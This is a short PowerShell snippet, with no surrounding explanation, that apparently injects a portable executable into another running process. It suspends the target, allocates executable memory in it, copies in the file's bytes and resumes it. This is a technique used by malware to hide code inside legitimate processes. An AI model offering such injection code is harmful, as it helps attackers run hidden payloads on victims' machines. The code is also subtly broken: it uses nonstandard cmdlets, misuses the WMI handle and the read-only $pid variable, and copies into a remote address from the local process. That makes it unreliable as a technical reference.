# Get the process ID of the process to inject into
$pid = (Get-Process -Name <process-name>).Id

# Open the process and get a handle to it
$handle = (Get-WmiObject -Class Win32_Process -Filter "ProcessId = $pid").Handle

# Suspend the process
Suspend-Process -Id $pid

# Map the portable executable into the process's memory
$memoryAddress = (Invoke-Win32Method -Name VirtualAllocEx -ObjectHandle $handle -ArgumentList (0), (0x1000), 0x3000, 0x40).returnValue
$assemblyBytes = [System.IO.File]::ReadAllBytes("<path-to-PE-file>")
[System.Runtime.InteropServices.Marshal]::Copy($assemblyBytes, 0, $memoryAddress, $assemblyBytes.Length)

# Resume the process
Resume-Process -Id $pid
